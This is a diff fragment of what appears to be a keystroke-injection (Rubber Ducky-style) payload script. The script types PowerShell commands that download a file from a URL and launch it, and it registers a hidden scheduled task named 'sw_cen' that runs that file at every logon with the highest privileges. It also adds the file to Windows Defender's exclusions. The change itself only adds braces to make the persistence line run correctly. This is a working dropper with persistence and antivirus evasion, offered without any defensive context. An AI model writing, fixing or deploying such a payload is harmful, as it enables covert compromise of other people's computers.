@@ -25,7 +25,7 @@ STRING Invoke-WebRequest -Uri $url -OutFile $output ; if($?) { Start-Process ".\
 ENTER
 DELAY 250
 DELAY 500
-STRING if($?) Register-ScheduledTask -TaskName "sw_cen" -Action (New-ScheduledTaskAction -Execute $output) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force
+STRING if($?) {Register-ScheduledTask -TaskName "sw_cen" -Action (New-ScheduledTaskAction -Execute $output) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force}
 ENTER
 DELAY 250
 STRING if($?) {Add-MpPreference -ExclusionProcess $output}
